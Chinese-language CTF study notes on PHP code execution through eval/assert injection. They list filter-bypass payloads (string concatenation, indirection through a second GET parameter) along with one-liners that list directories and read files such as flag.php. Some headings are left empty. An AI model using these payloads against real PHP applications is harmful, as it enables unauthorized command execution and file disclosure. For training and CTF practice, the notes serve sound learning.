# Web3-命令执行与注入

这里主要讲的是 PHP 中的命令执行与注入。分为 代码执行 和 命令执行 两部分。

## 代码执行

代码执行指题目允许用 php 的 `eval` 函数和 `assert` 函数来执行指定代码，同时给了一些限制，我们需要绕过这些限制。

```php
if (isset($_GET["c"])) {
    $c = $_GET["c"];
    if (xxx) { // 题目的限制
        eval($c);
    }
}
```

### 黑名单字符串绕过

黑名单字符串，即不允许有指定的字符串出现。如不允许有 `flag` 出现。

#### 拼接法

即用 PHP 的字符串拼接来绕过：

```
?c=system("cat fl"."ag.php");
```

#### 用 GET 参数绕过

引用其他的 GET 参数，例如 

```
?c=system($_GET[1]);
```

因为受限制的只有 c 参数，而 GET 的 1 参数没有黑名单，所以就绕过啦。

#### 括号绕过

可以使用无需括号的函数，例如 include 和 require，不过这就需要一些文件包含的知识了。

#### 用命令绕过的技巧绕过

如果可以直接调用 system 函数来执行命令，也可以应用命令绕过的技巧，这个请参见第二部分。

### Disable function 绕过

## PHP 常用函数读取 flag

### 查看当前目录整体地址

- `c=print_r(scandir('./'));`
- `c=var_dump(scandir('./'));`
- `c=print_r(scandir(dirname('__FILE__')));`
- `c=print_r(scandir(current(localeconv())));`
- `c=$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };`

### 查看根目录

- `c=print_r(scandir("/"));
- `c=var_dump(scandir('/'));
- `c=var_export(scandir('/'));
- `c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}

### 通过单一函数读取文件

- `c=show_source('flag.php');- `
- `c=echo file_get_contents("flag.php");`
- `c=readfile("flag.php");	`
- `c=var_dump(file('flag.php'));`
- `c=print_r(file('flag.php'));`

### 通过fopen读取文件内容

- `fread()`
- `fgets()`
- `fgetc()`
- `fgetss()`
- `fgetcsv()`
- `fpassthru()`
